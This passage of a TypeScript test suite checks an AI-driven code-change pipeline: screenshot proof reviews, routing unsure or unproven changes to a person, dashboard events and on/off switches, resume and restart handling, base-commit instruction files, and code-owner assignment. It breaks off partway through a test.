test("the reviewer gets the screenshots and the verdicts are saved", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, proof: VISUAL_PROOF, factoryFile: PREVIEW, reviews: [[reviewOf("matches")]] }));
  const job = w.harness.jobs.find((j) => j.role === "reviewer")!;
  expect(job.images?.map((i) => i.name)).toEqual(["before-list-1280.png", "after-list-1280.png"]);
  expect(job.prompt).toContain("</proof>");
  expect(reviewData(w).proof.verdicts).toEqual([{ screen: "list page", verdict: "matches", note: "no spinner" }]);
});
test("the author gets the preview flag only when the target has a preview", async () => {
  const jobs = async (factoryFile?: string) => (await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, factoryFile, reviews: [[B], []] }))).harness.jobs.filter((j) => j.role === "author");
  const withPreview = await jobs(PREVIEW);
  expect(withPreview.find((j) => !j.resume)?.preview).toBe(true);
  expect(withPreview.find((j) => j.resume)?.preview).toBe(true);
  const without = await jobs();
  expect(without.find((j) => j.resume)).toBeDefined();
  expect(without.every((j) => !j.preview)).toBe(true);
});
test("the first author prompt tells how the preview runs, or to take no screenshots", async () => {
  const first = async (factoryFile?: string) => (await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, factoryFile }))).harness.jobs.find((j) => j.role === "author" && !j.resume)!.prompt;
  expect(await first("install: pnpm install\nlint: pnpm lint\ntest: pnpm test:unit\nbuild: pnpm build\npreview: NEXT_PUBLIC_APP_ENV=development NEXT_PUBLIC_MOCK_ALL=true pnpm dev\npreviewUrl: http://localhost:3000\n"))
    .toContain("Preview: start the app with `NEXT_PUBLIC_APP_ENV=development NEXT_PUBLIC_MOCK_ALL=true pnpm dev`. It serves http://localhost:3000.");
  expect(await first()).toContain("Take no screenshots");
});
test("a reviewer model that does not read images gets none, and every screen is unsure", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" }, proof: VISUAL_PROOF, factoryFile: PREVIEW, reviews: [[reviewOf("matches")]] });
  w.ctx.seams.providers.tensorx.images = [];
  await runBuildPipeline(w);
  const job = w.harness.jobs.find((j) => j.role === "reviewer")!;
  expect(job.images).toBeUndefined();
  expect(reviewData(w).proof).toMatchObject({ readsImages: false, verdicts: [{ screen: "list page", verdict: "unsure" }] });
});
test("a harness that does not read images gets none, and the screen is unsure", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" }, proof: VISUAL_PROOF, factoryFile: PREVIEW, reviews: [[reviewOf("matches")]] });
  w.ctx.harnesses.pi = { ...w.harness, images: false };
  await runBuildPipeline(w);
  const job = w.harness.jobs.find((j) => j.role === "reviewer")!;
  expect(job.images).toBeUndefined();
  expect(reviewData(w).proof).toMatchObject({ readsImages: false, verdicts: [{ screen: "list page", verdict: "unsure" }] });
});
test("a does_not_match from a reviewer that cannot read images does not block", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" }, proof: VISUAL_PROOF, factoryFile: PREVIEW, reviews: [[reviewOf("does_not_match")], [reviewOf("does_not_match")], [reviewOf("does_not_match")]] });
  w.ctx.seams.providers.tensorx.images = [];
  await runBuildPipeline(w);
  expect(w.states).not.toContain("blocked");
  expect(reviewData(w).proof).toMatchObject({ verdicts: [{ screen: "list page", verdict: "unsure" }] });
});
test("a does_not_match for a screen with no after image does not block", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, proof: VISUAL_PROOF, images: { "before-list-1280.png": PNG }, factoryFile: PREVIEW, reviews: [[reviewOf("does_not_match")], [reviewOf("does_not_match")], [reviewOf("does_not_match")]] }));
  expect(w.states).not.toContain("blocked");
  expect(reviewData(w).proof).toMatchObject({ verdicts: [{ screen: "list page", verdict: "unsure", note: "no after image" }] });
});

// Spec 12: a change without proof goes to a person.
const approvalReasons = (w: ReturnType<typeof fakeWorld>) => (w.record.steps.find((s) => s.step === "decision")?.data as any).reasons as string[];
test("an unsure verdict sends the change to a person", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, proof: VISUAL_PROOF, factoryFile: PREVIEW, reviews: [[{ ...reviewOf("unsure"), text: "cannot see the spinner" }]] }));
  expect(w.states).toEqual(["needs_approval"]);
  expect(w.finishTriggered).toBe(false);
  expect(w.mrComments.at(-1)).toContain("screen list page: the reviewer is unsure: cannot see the spinner");
});
test("a visual change with no screens sends the change to a person", async () => {
  const proof = { visual: true, screens: [], tests: [], note: "the dev server did not start" };
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, proof, factoryFile: PREVIEW, reviews: [[]] }));
  expect(w.states).toEqual(["needs_approval"]);
  expect(approvalReasons(w).join("\n")).toContain("the dev server did not start");
});
test("a change with no visual part and a test that failed before and passed after merges on the existing rules", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[]] }));
  expect(w.finishTriggered).toBe(true);
  expect(w.states).toEqual(["running"]);
});
test("the same change with no such test goes to a person", async () => {
  const proof = { ...TEST_PROOF, tests: [{ ...TEST_PROOF.tests[0], before: { exit: 0, tail: "" } }] };
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, proof, reviews: [[]] }));
  expect(w.states).toEqual(["needs_approval"]);
  expect(approvalReasons(w)).toContain("no test failed before the change and passed after it");
});
test("a change with no proof file goes to a person", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, proof: null, reviews: [[]] }));
  expect(w.states).toEqual(["needs_approval"]);
  expect(approvalReasons(w)).toContain("no proof: no run/proof/proof.json");
});

// Spec 6.5 and 12: the Proof section of the change, and the screenshots it links.
const visual = (o: WorldOptions = {}) => fakeWorld({ jev1: { risk: "trivial" }, proof: VISUAL_PROOF, factoryFile: PREVIEW, reviews: [[reviewOf("matches")]], ...o });
test("the Proof section appears in the description", async () => {
  const w = await runBuildPipeline(visual());
  expect(w.mrDescription).toContain("## Proof");
  expect(w.mrDescription).toContain("### Screen 1: list page, 1280 px: matches");
  expect(w.mrDescription).toContain("![before](/uploads/1/before-list-1280.png)");
  expect(w.mrDescription).toContain("- list-spinner: failed before, passes after");
  expect(w.host.attached.map((a) => a.name)).toEqual(["before-list-1280.png", "after-list-1280.png"]);
});
test("a change that merges alone has the Proof section with its test line", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[]] }));
  expect(w.finishTriggered).toBe(true);
  expect(w.mrDescription).toContain("## Proof");
  expect(w.mrDescription).toContain("- list-spinner: failed before, passes after");
});
test("a proof whose test tail holds a secret blocks, and nothing is uploaded or pushed", async () => {
  const proof = { ...TEST_PROOF, tests: [{ ...TEST_PROOF.tests[0], after: { exit: 0, tail: "token=glpat-abcdefghijklmnopqrst1234" } }] };
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, proof, reviews: [[]] }));
  expect(w.states).toEqual(["blocked"]);
  expect(w.workItemComments.at(-1)).toContain("secret-looking value");
  expect(w.host.attached).toEqual([]);
  expect(w.commitMessage).toBe("");
  expect(w.mrOpened).toBe(false);
});
test("a resume at the decision step changes and uploads nothing", async () => {
  const w = await runBuildPipeline(visual());
  const [description, uploads] = [w.mrDescription, w.host.attached.length];
  save(w.ctx, "event", { ticket: "8", resumeAt: "decision" });
  await decision.run(w.ctx);
  expect(w.mrDescription).toBe(description);
  expect(w.host.attached).toHaveLength(uploads);
});
test("an image upload that keeps failing still opens the change and sends it to a person", async () => {
  const w = await runBuildPipeline(visual({ attachFails: 99 }));
  expect(w.states).toEqual(["needs_approval"]);
  expect(w.mrOpened).toBe(true);
  expect(w.mrDescription).toContain("image upload failed");
  expect(w.host.attachCalls).toBe(8);
  expect(w.mrComments.at(-1)).toContain("image upload failed: before-list-1280.png, after-list-1280.png");
  const calls = w.host.attachCalls;
  save(w.ctx, "event", { ticket: "8", resumeAt: "decision" });
  await decision.run(w.ctx);
  expect(w.host.attachCalls).toBe(calls);
  expect(w.mrDescription).toContain("image upload failed");
});
test("an upload that works on its last retry adds no reason", async () => {
  const w = await runBuildPipeline(visual({ attachFails: 3 }));
  expect(w.host.attached.map((a) => a.name)).toEqual(["before-list-1280.png", "after-list-1280.png"]);
  expect(w.mrDescription).not.toContain("image upload failed");
  expect(w.finishTriggered).toBe(true);
});
test("makeContext needs the dashboard token and a real dashboardUrl", () => {
  const dir = tmp();
  const env = { CI_SERVER_URL: GITLAB_URL, CI_PROJECT_ID: "3", FACTORY_PIPELINE: "build", FACTORY_TARGET: "react_frontend", FACTORY_GITLAB_TOKEN: join(dir, "gl"), TEAMS_WEBHOOK_URL: join(dir, "teams"), FACTORY_DASHBOARD_TOKEN: join(dir, "dash") };
  const files = (...ks: string[]) => { for (const k of ks) writeFileSync(join(dir, k), "x"); };
  files("gl", "teams");
  expect(() => makeContext({ ...env, FACTORY_DASHBOARD_TOKEN: "" }, dir, seamsFile(dir))).toThrow("FACTORY_DASHBOARD_TOKEN is not set");
  files("gl", "teams", "dash");
  const placeholder = seamsFile(dir, (t) => t.replace(/^dashboardUrl: .*$/m, "dashboardUrl: REPLACE_WITH_DASHBOARD_URL"));
  expect(() => makeContext(env, dir, placeholder)).toThrow(/dashboardUrl is still a placeholder/);
});

// Task B2: each run has an ID, and its steps send events to the dashboard.
const dash = (w: ReturnType<typeof fakeWorld>) => w.ctx.dashboard as ReturnType<typeof fakeDashboard>;
// The whole run as CI runs it: the build jobs, then the finish jobs that load the build record.
async function runAllJobs(w: ReturnType<typeof fakeWorld>) {
  const buildDir = tmp();
  await runBuildJobs(w, buildDir);
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", change: "5", buildRun: "1", run: "2" };
  w.ci.buildRecord = async () => loadRecord(buildDir);
  const finishDir = tmp();
  for (const [name, s] of [["apply", apply], ["verify", verify], ["result-saved", resultSaved]] as const) await runStep(name, s.run, { dir: finishDir, make: () => w.ctx });
  return w;
}
test("a low-risk run sends run_start, a start and an end per step, usage, Jev answers, the decision and run_end done, all with one run ID", async () => {
  const w = await runAllJobs(fakeWorld({ jev1: { risk: "low" } }));
  const events = dash(w).events;
  expect(w.closed).toBe(true);
  expect(events[0].type).toBe("run_start");
  expect(new Set(events.map((e) => e.run))).toEqual(new Set([w.record.runId]));
  expect(w.record.runId).toMatch(/^[0-9a-f-]{36}$/);
  const steps = ["event", "triage", "prepare-patch", "code-review", "precommit-gate", "risk-check", "decision", "apply", "verify", "result-saved"];
  expect(events.filter((e) => e.type === "step_start").map((e) => e.step)).toEqual(steps);
  expect(events.filter((e) => e.type === "step_end").map((e) => [e.step, e.data.outcome])).toEqual(steps.map((s) => [s, "next"]));
  for (const s of steps) expect(events.findIndex((e) => e.type === "step_start" && e.step === s)).toBeLessThan(events.findIndex((e) => e.type === "step_end" && e.step === s));
  expect(events.filter((e) => e.type === "usage").length).toBeGreaterThan(0);
  expect(new Set(events.filter((e) => e.type === "jev_answer").map((e) => e.step))).toEqual(new Set(["triage", "risk-check"]));
  expect(events.filter((e) => e.type === "decision").map((e) => e.data)).toEqual([{ auto: true, reasons: [] }]);
  expect(events.filter((e) => e.type === "label_change").at(-1)?.data).toEqual({ to: "factory_done" });
  // run_end is the last event of the run; only its own step's end comes after it.
  expect(events.slice(-2).map((e) => [e.type, e.data.outcome])).toEqual([["run_end", "done"], ["step_end", "next"]]);
  // Every event passes the dashboard's own check.
  for (const e of events) expect(runEvent.safeParse(e).success, e.type).toBe(true);
});
test("a resumed run keeps the run ID of the run it continues", async () => {
  const first = fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" });
  await runBuildJobs(first, tmp());
  const runId = first.record.runId;
  expect(runId).toBeDefined();
  const w = resumeWorld({ jev1: { risk: "trivial" } }, first);
  await runBuildJobs(w, tmp());
  expect(w.finishTriggered).toBe(true);
  expect(w.record.runId).toBe(runId);
  expect(dash(w).events.length).toBeGreaterThan(0);
  expect(new Set(dash(w).events.map((e) => e.run))).toEqual(new Set([runId]));
  expect(dash(w).events.some((e) => e.type === "run_start")).toBe(false);
});
// The dashboard goes down once the event step has claimed the run: with it down from the start, no new run starts (Task B4).
const downOnceRunning = (w: ReturnType<typeof fakeWorld>) => {
  const set = w.tracker.setState;
  w.tracker.setState = async (ref, state) => {
    await set(ref, state);
    if (state === "running") dash(w).down = true;
  };
};
test("a run ends the same while the dashboard is down", async () => {
  const up = await runAllJobs(fakeWorld({ jev1: { risk: "low" } }));
  const w = fakeWorld({ jev1: { risk: "low" } });
  downOnceRunning(w);
  await runAllJobs(w);
  expect(dash(w).events.map((e) => e.type)).toEqual(["run_start", "step_start"]);
  expect([w.states, w.closed, w.merged, w.workItemComments.length]).toEqual([up.states, up.closed, up.merged, up.workItemComments.length]);
});

// Fix round 1: step_end outcomes, and a declined resume sends nothing to the old run.
const stepEnds = (w: ReturnType<typeof fakeWorld>) => dash(w).events.filter((e) => e.type === "step_end").map((e) => [e.step, e.data.outcome]);
test("a step that stops for a person ends as stopped, and one at the usage limit as waiting", async () => {
  const stopped = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, prepare: "stop" }), tmp());
  expect(stepEnds(stopped).at(-1)).toEqual(["prepare-patch", "stopped"]);
  const limit = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }), tmp());
  expect(stepEnds(limit).at(-1)).toEqual(["prepare-patch", "waiting"]);
});
test("a declined @factory resume sends no step start or end to the old run", async () => {
  const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, prepare: "stop" }), tmp());
  const w = await resumeStopped({ otherRuns: 10 }, first);
  expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "repo-full" } });
  expect(dash(w).events.filter((e) => e.type === "step_start" || e.type === "step_end")).toEqual([]);
});
test("a successful @factory resume sends one paired start and end for the event step", async () => {
  const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, prepare: "stop" }), tmp());
  const w = await resumeStopped({}, first);
  expect(w.finishTriggered).toBe(true);
  const ev = dash(w).events.filter((e) => e.step === "event" && (e.type === "step_start" || e.type === "step_end"));
  expect(ev.map((e) => e.type)).toEqual(["step_start", "step_end"]);
  expect(new Set(dash(w).events.map((e) => e.run))).toEqual(new Set([first.record.runId]));
});

// Task B3: author tool calls go to the dashboard under the step; usage carries the cache and context tokens.
test("an author's tool calls are sent as tool_call events under their step, a reviewer's are not asked for, and usage has the cache tokens", async () => {
  const w = await runAllJobs(fakeWorld({ jev1: { risk: "low" } }));
  const events = dash(w).events;
  const calls = events.filter((e) => e.type === "tool_call");
  expect(calls.length).toBeGreaterThan(0);
  const starts = new Map(events.filter((e) => e.type === "step_start").map((e) => [e.id, e.step]));
  for (const c of calls) {
    expect(c.parent && starts.get(c.parent)).toBeTruthy();
    expect(c.data).toEqual({ name: "Read", input: '{"file_path":"a.ts"}', result: "text", ms: 12, ok: true });
    expect(runEvent.safeParse(c).success).toBe(true);
  }
  expect(new Set(calls.map((c) => starts.get(c.parent!)))).toEqual(new Set(["prepare-patch"]));
  const jobs = w.harness.jobs;
  expect(jobs.filter((j) => j.role === "author").every((j) => typeof j.onToolCall === "function")).toBe(true);
  expect(jobs.filter((j) => j.role !== "author").length).toBeGreaterThan(0);
  expect(jobs.filter((j) => j.role !== "author").every((j) => j.onToolCall === undefined)).toBe(true);
  const usage = events.filter((e) => e.type === "usage" && e.data.role === "author");
  expect(usage[0].data).toMatchObject({ input: 100, output: 20, cacheRead: 7, cacheWrite: 3, contextTokens: 110 });
});

// Task B4: the dashboard switches. No saved value means on; an unreachable dashboard counts as on, except new_runs.
const withSwitches = (w: ReturnType<typeof fakeWorld>, ...off: SwitchName[]) => {
  const switches = Object.fromEntries(SWITCHES.map((n) => [n, !off.includes(n)])) as Record<SwitchName, boolean>;
  w.ctx.dashboard = fakeDashboard({ switches });
  return switches;
};
test("prepare_patch off stops the run before any author job, and turning it on resumes it at prepare-patch", async () => {
  const first = fakeWorld({ jev1: { risk: "trivial" } });
  const switches = withSwitches(first, "prepare_patch");
  await runBuildJobs(first, tmp());
  expect(first.states).toEqual(["stopped"]);
  expect(first.harness.jobs).toEqual([]);
  expect(first.ran).toEqual([]);
  expect(first.workItemComments.at(-1)).toMatch(/^Stopped run: pipeline 1$/m);
  expect(first.workItemComments.at(-1)).toMatch(/^Stopped step: prepare-patch$/m);
  expect(first.workItemComments.at(-1)).toMatch(/^Reason: switch off prepare_patch$/m);
  expect(first.record.steps.at(-1)).toMatchObject({ step: "prepare-patch", data: { stopped: true, switchOff: true } });
  expect(stepEnds(first).at(-1)).toEqual(["prepare-patch", "stopped"]);
  // Still off, or the dashboard cannot be reached: nothing starts.
  expect(await resumeSwitchedOff(first.ctx)).toEqual([]);
  switches.prepare_patch = true;
  dash(first).down = true;
  expect(await resumeSwitchedOff(first.ctx)).toEqual([]);
  dash(first).down = false;
  expect(await resumeSwitchedOff(first.ctx)).toEqual(["8"]);
  expect(first.ci.started.at(-1)).toEqual({ kind: "build", ticket: "8", buildRun: "1" });
  const w = resumeWorld({ jev1: { risk: "trivial" }, state: "stopped" }, first);
  await runBuildJobs(w, tmp());
  expect(w.restored).toEqual(["1"]);
  expect(w.jevAsked).toBe(1); // only Jev 2: triage did not run again
  expect(w.claudeRuns[0].resume).toBeUndefined();
  expect(w.claudeRuns[0].prompt).toContain(ticketText(w.ctx));
  expect(w.finishTriggered).toBe(true);
});
test("a person's stop note gives its reason, and the poller does not resume it", async () => {
  const w = await stopRecord();
  expect(w.workItemComments.at(-1)).toMatch(/^Reason: stopped by @factory stop$/m);
  expect(await resumeSwitchedOff(w.ctx)).toEqual([]);
});
test("questions off stops before the questions agent, and its resume asks the questions without triage again", async () => {
  const first = fakeWorld({ jev1: { clarity: 4 } });
  const switches = withSwitches(first, "questions");
  await runBuildJobs(first, tmp());
  expect(first.claudeCalls).toBe(0);
  expect(first.states).toEqual(["stopped"]);
  expect(first.workItemComments.at(-1)).toMatch(/^Reason: switch off questions$/m);
  switches.questions = true;
  expect(await resumeSwitchedOff(first.ctx)).toEqual(["8"]);
  const w = resumeWorld({ jev1: { clarity: 4 }, state: "stopped" }, first);
  await runBuildJobs(w, tmp());
  expect(w.jevAsked).toBe(0);
  expect(w.claudeRuns).toHaveLength(1);
  expect(w.claudeRuns[0].resume).toBeUndefined();
  expect(w.states).toEqual(["needs_info"]);
});
test("auto_merge off sends a run that would merge alone to a person", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  withSwitches(w, "auto_merge");
  await runBuildJobs(w, tmp());
  expect(w.states).toEqual(["needs_approval"]);
  expect(w.finishTriggered).toBe(false);
  expect(w.mrComments.at(-1)).toContain("auto-merge is switched off");
});
test("new_runs off: a webhook ready starts nothing and the ticket stays ready", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  withSwitches(w, "new_runs");
  await runBuildJobs(w, tmp());
  expect(w.record.steps.map((s) => s.step)).toEqual(["event"]);
  expect(w.record.steps[0].data).toMatchObject({ start: false, reason: "switch-off" });
  expect(w.states).toEqual(["ready"]);
  expect(w.jevAsked).toBe(0);
});
test("with the dashboard down a running run goes on and merges alone, and a new run does not start", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" } });
  downOnceRunning(w);
  await runBuildJobs(w, tmp());
  expect(w.claudeCalls).toBeGreaterThan(0);
  expect(w.finishTriggered).toBe(true);
  const fresh = fakeWorld({ jev1: { risk: "trivial" } });
  dash(fresh).down = true;
  await runBuildJobs(fresh, tmp());
  expect(fresh.record.steps[0].data).toMatchObject({ start: false, reason: "switch-off" });
  expect(fresh.states).toEqual(["ready"]);
});
test("apply off stops the finish run, and turning it on starts a finish run with the change", async () => {
  const w = fakeWorld();
  const switches = withSwitches(w, "apply");
  w.ci.vars = { ...w.ci.vars, buildRun: "41", run: "2" };
  await runFinishPipeline(w);
  expect(w.merged).toBe(false);
  expect(w.states).toEqual(["stopped"]);
  const note = w.workItemComments.at(-1)!;
  for (const line of ["Stopped run: pipeline 2", "Stopped step: apply", "Reason: switch off apply", "Change: 5", "Build run: 41"]) expect(note).toContain(`\n${line}`);
  switches.apply = true;
  expect(await resumeSwitchedOff(w.ctx)).toEqual(["8"]);
  expect(w.ci.started.at(-1)).toEqual({ kind: "finish", ticket: "8", change: "5", buildRun: "41" });
  expect(w.states).toEqual(["running"]);
});
// Fix round 1 (R39, R40).
test("apply off does not stop a finish run after a hand merge", async () => {
  const w = fakeWorld({ mrState: "merged" });
  withSwitches(w, "apply");
  await runFinishPipeline(w, { decision: "needs_approval", skipApply: true });
  expect(w.record.steps.find((s) => s.step === "apply")?.data).toMatchObject({ skipped: true });
  expect(w.record.steps.some((s) => s.step === "verify")).toBe(true);
  expect(w.states).toEqual(["done"]);
});
test("a resumed apply sends label_change factory_running to the stopped run, and a failed start leaves the ticket stopped", async () => {
  const w = fakeWorld();
  const switches = withSwitches(w, "apply");
  w.ci.vars = { ...w.ci.vars, buildRun: "41", run: "2" };
  await runFinishPipeline(w);
  const record = { ...w.record, runId: "run-41", steps: w.record.steps.filter((s) => s.step !== "apply") };
  switches.apply = true;
  const start = w.ci.start;
  w.ci.start = async () => { throw new Error("CI is down"); };
  await expect(resumeSwitchedOff(w.ctx)).rejects.toThrow("CI is down");
  expect(w.states).toEqual(["stopped"]);
  w.ci.start = start;
  expect(await resumeSwitchedOff(w.ctx)).toEqual(["8"]);
  w.ci.buildRecord = async () => record;
  await runStep("apply", apply.run, { dir: tmp(), make: () => w.ctx });
  expect(w.merged).toBe(true);
  expect(dash(w).events.filter((e) => e.type === "label_change").map((e) => [e.run, e.data])).toEqual([["run-41", { to: "factory_running" }]]);
});
test("parseStoppedNote reads back the note stopped() writes", () => {
  const body = stoppedNote({ run: "2", step: "apply", reason: "switch off apply", change: "5", buildRun: "41" });
  expect(parseStoppedNote(body)).toEqual({ run: "2", step: "apply", reason: "switch off apply", change: "5", buildRun: "41" });
  expect(parseStoppedNote("hello")).toBeUndefined();
});

// Task B6: resume and restart from the dashboard, and the open item of B4.
const restartRequest = (run: string, o: Partial<ControlRequest> = {}): ControlRequest => ({ id: "q1", kind: "restart", run, target: "react_frontend", ticket: "8", user: "ana", at: new Date().toISOString(), ...o });
test("a restart ends the old run as blocked, sets ready, and that build's event step starts a new run for the request's user", async () => {
  const first = await runBuildJobs(fakeWorld({ jev1: { risk: "trivial" }, prepare: "stop" }), tmp());
  const oldRun = first.record.runId!;
  const w = fakeWorld({ jev1: { risk: "trivial" }, state: "stopped" });
  const request = restartRequest(oldRun);
  const d = fakeDashboard({ requests: [request] });
  w.ctx.dashboard = d;
  const states: string[] = [];
  const set = w.tracker.setState;
  w.tracker.setState = async (ref, state) => (states.push(state), set(ref, state));
  await handleRequests(w.ctx);
  expect(states).toEqual(["blocked", "ready"]);
  expect(w.workItemComments).toEqual(["Restarted from the dashboard by @ana. This run ends as blocked and a new run starts."]);
  expect(w.ci.started).toEqual([{ kind: "build", ticket: "8" }]);
  expect(d.done).toEqual([["q1", "done"]]);
  const ends = d.events.filter((e) => e.type === "run_end");
  expect(ends.map((e) => [e.run, e.ticket, e.data])).toEqual([[oldRun, "8", { outcome: "restarted" }]]);
  expect(runEvent.safeParse(ends[0]).success).toBe(true);
  // The new build: no payload, and the factory set the ticket ready.
  request.outcome = "done";
  w.tracker.startedBy = async () => BOT;
  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8" };
  await runStep("event", event.run, { dir: tmp(), make: () => w.ctx });
  expect(w.record.steps[0]).toMatchObject({ step: "event", data: { start: true, actor: "ana" } });
  expect(w.record.runId).toMatch(/^[0-9a-f-]{36}$/);
  expect(w.record.runId).not.toBe(oldRun);
  expect(w.states).toEqual(["running"]);
});
test("a ready the factory set starts no run without a recent restart of that ticket by a trusted person", async () => {
  const old = new Date(Date.now() - 16 * 60_000).toISOString();
  for (const requests of [[], [restartRequest("run-1", { at: old })], [restartRequest("run-1", { ticket: "9" })], [restartRequest("run-1", { outcome: "refused" })]]) {
    const w = fakeWorld({ payload: { kind: "ready", ticket: "8", actor: BOT } });
    w.ctx.dashboard = fakeDashboard({ requests });
    await runBuildPipeline(w);
    expect(w.record.steps[0]).toMatchObject({ step: "event", data: { start: false, reason: "not-member" } });
  }
  const untrusted = fakeWorld({ payload: { kind: "ready", ticket: "8", actor: BOT }, actorLevel: 20 });
  untrusted.ctx.dashboard = fakeDashboard({ requests: [restartRequest("run-1")] });
  await runBuildPipeline(untrusted);
  expect(untrusted.record.steps[0]).toMatchObject({ step: "event", data: { start: false, reason: "not-member" } });
});
// B4 open item: a run the apply switch stopped resumes as a finish run with its change, from a person or the dashboard.
const applyStopped = async () => {
  const w = fakeWorld();
  withSwitches(w, "apply");
  w.ci.vars = { ...w.ci.vars, buildRun: "41", run: "2" };
  await runFinishPipeline(w);
  w.ci.started.length = 0;
  return w;
};
test("@factory resume or a dashboard resume of a run the apply switch stopped starts a finish run with the change", async () => {
  const w = await applyStopped();
  w.ci.vars = { ...w.ci.vars, payload: command("resume"), ticket: undefined, change: undefined, buildRun: undefined, run: "3" };
  await runStep("event", event.run, { dir: tmp(), make: () => w.ctx });
  expect(w.ci.started).toEqual([{ kind: "finish", ticket: "8", change: "5", buildRun: "41" }]);
  expect(w.restored).toEqual([]);
  expect(w.states).toEqual(["running"]);
  const viaDashboard = await applyStopped();
  const d = fakeDashboard({ requests: [{ ...restartRequest("run-1"), kind: "resume" }] });
  viaDashboard.ctx.dashboard = d;
  await handleRequests(viaDashboard.ctx);
  expect(viaDashboard.ci.started).toEqual([{ kind: "finish", ticket: "8", change: "5", buildRun: "41" }]);
  expect(viaDashboard.states).toEqual(["running"]);
  expect(d.done).toEqual([["q1", "done"]]);
});
// R30: after a cancel, the newest factory note is the cancel, so an older stop is not resumed.
test("@factory resume after a cancel from the dashboard starts nothing", async () => {
  const w = fakeWorld({ state: "stopped", payload: command("resume") });
  await w.tracker.comment("8", "Stopped run: pipeline 1");
  await w.tracker.comment("8", cancelNote("dev"));
  w.ci.buildRecord = async () => (await stopRecord()).record;
  await runBuildJobs(w, tmp());
  expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "cancelled" } });
  expect(w.restored).toEqual([]);
  expect(w.states).toEqual(["stopped"]);
});

// Part E: repo-local instructions. The author, the reviewer and the writers read them from the base commit or the base branch.
test("the author's prepare and fix prompts hold the base commit's author.md, never the work tree's", async () => {
  const w = fakeWorld({ jev1: { risk: "trivial" }, baseFiles: { ".factory/author.md": "BASE RULE" }, reviews: [[{ ...reviewOf("matches"), blocking: true }], []] });
  w.ctx.repo.readFile = ((read) => (path: string) => (path === ".factory/author.md" ? "AGENT EDIT" : read(path)))(w.ctx.repo.readFile);
  await runBuildPipeline(w);
  const author = w.harness.jobs.filter((j) => j.role === "author");
  expect(author.length).toBeGreaterThanOrEqual(2);
  for (const j of author) {
    expect(j.prompt).toContain("BASE RULE");
    expect(j.prompt).not.toContain("AGENT EDIT");
  }
});
test("the reviewer prompt holds review.md from the base commit", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, baseFiles: { ".factory/review.md": "REVIEW RULE" } }));
  expect(w.harness.jobs.find((j) => j.role === "reviewer")!.prompt).toContain("REVIEW RULE");
});
test("the questions writer holds writer.md from the base branch", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { clarity: 4 }, files: { ".factory/writer.md": "WRITER RULE" } }));
  expect(w.claudeRuns[0].prompt).toContain("WRITER RULE");
});
test("a resumed author session gets no section again", async () => {
  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit", baseFiles: { ".factory/author.md": "BASE RULE" } }));
  const w = resumeWorld({ jev1: { risk: "trivial" }, baseFiles: { ".factory/author.md": "BASE RULE" } }, { record: first.record });
  await runBuildJobs(w, tmp());
  const resumed = w.harness.jobs.find((j) => j.role === "author" && j.resume)!;
  expect(resumed.prompt).not.toContain("BASE RULE");
});
test("with no .factory files the prompts are the factory's own, with nothing added", async () => {
  const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" } }));
  const first = w.harness.jobs.find((j) => j.role === "author" && !j.resume)!;
  expect(first.prompt).toBe(`${prompt("prepare")}\n\n${previewLine(parseFactoryFile("install: i\nlint: l\ntest: t\nbuild: b"))}\n\n${ticketText(w.ctx)}`);
  expect(reviewerPrompt("T", "D")).toBe(`${prompt("review")}\n\nT\n\n<diff>\nD\n</diff>`);
});

// Part D: a change that goes to a person goes to the ticket assignee, else the top trusted code owner of its files, else the default approver.
const medium = (o: WorldOptions = {}) => fakeWorld({ jev1: { risk: "medium" }, reviews: [[]], gate: "green", jev2: "pass", ...o });
const assignedTo = (w: ReturnType<typeof fakeWorld>) => w.host.assigned.map((a) => a.person);
test("a change goes to the code owner of its files", async () => {
  const w = await runBuildPipeline(medium({ files: { CODEOWNERS: "src/ @owner" } }));
  expect(assignedTo(w)).toEqual(["owner"]);
});
test("the code owner is read from the first CODEOWNERS path that exists", async () => {
  const w = await runBuildPipeline(medium({ files: { ".github/CODEOWNERS": "src/ @owner", "docs/CODEOWNERS": "src/ @other" } }));
  expect(assignedTo(w)).toEqual(["owner"]);
});
test("an untrusted code owner is skipped for the next owner, then for the default approver", async () => {
  const w = medium({ files: { CODEOWNERS: "src/ @owner @second" } });
  w.tracker.trusted = async (a) => a !== "owner";
  expect(assignedTo(await runBuildPipeline(w))).toEqual(["second"]);
  const w2 = medium({ files: { CODEOWNERS: "src/ @owner" } });
  w2.tracker.trusted = async (a) => a !== "owner";
  expect(assignedTo(await runBuildPipeline(w2))).toEqual(["approver"]);
});
test("a code owner who is the factory bot is never assigned", async () => {
  const w = medium({ files: { CODEOWNERS: `src/ @${BOT}` } });
  w.tracker.trusted = async () => true;
